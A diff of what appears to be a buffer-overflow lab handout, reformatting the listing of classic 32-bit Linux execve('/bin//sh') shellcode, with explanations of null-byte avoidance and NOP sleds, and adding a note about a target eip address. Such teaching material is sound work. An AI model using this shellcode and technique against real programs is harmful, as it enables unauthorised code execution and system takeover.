@@ -189,17 +189,17 @@ Whenever you modify your shellcode, rerun this command.
 Let's take a look at what it does:
 
 ```
-31 c0 xorl %eax, %eax ; clear eax
-50 pushl %eax ; put a 0-pointer on the stack
-68 2f 2f 73 68 pushl "//sh" ; the command to call
-68 2f 62 69 6e pushl "/bin"
-89 e3 movl %esp, %ebx ; ebx points at the command
-50 pushl %eax ; another 0-pointer
-53 pushl %ebx ; points at the command
-89 e1 movl %esp, %ecx ; pointer to pointer to command
-99 cdq ; this zeroes out edx
-b0 0b movb $0x0b, %al ; execve syscall number
-cd 80 int $0x80 ; syscall
+31 c0           xorl %eax, %eax   ; clear eax
+50              pushl %eax        ; put a 0-pointer on the stack
+68 2f 2f 73 68  pushl "//sh"      ; the command to call
+68 2f 62 69 6e  pushl "/bin"
+89 e3           movl %esp, %ebx   ; ebx points at the command
+50              pushl %eax        ; another 0-pointer
+53              pushl %ebx        ; points at the command
+89 e1           movl %esp, %ecx   ; pointer to pointer to command
+99 cdq                            ; this zeroes out edx
+b0 0b           movb $0x0b, %al   ; execve syscall number
+cd 80           int $0x80         ; syscall
 ```
 
 We store `/bin//sh` with an extra `/` (that `execve` doesn't mind) since the `0x68` (`pushl`) instruction takes a 4-byte argument, and we don't want to include an `0x00` byte in our shellcode.
@@ -250,6 +250,11 @@ You can either experiment to find this offset (create a program that prints out 
 
 - If you can't get the exact address of your shellcode, you can use a NOP sled: a sequence of NOP (`0x90`) bytes before your actual shellcode starts, as long as possible.
 As long as you manage to jump to anywhere within the NOP sled, your program will "slide" down to the shellcode at the end and execute it.
+
+Notes:
+
+- Trying to set eip to `0xbffff267`
+
 
 Task 2: Defences
 ------------------
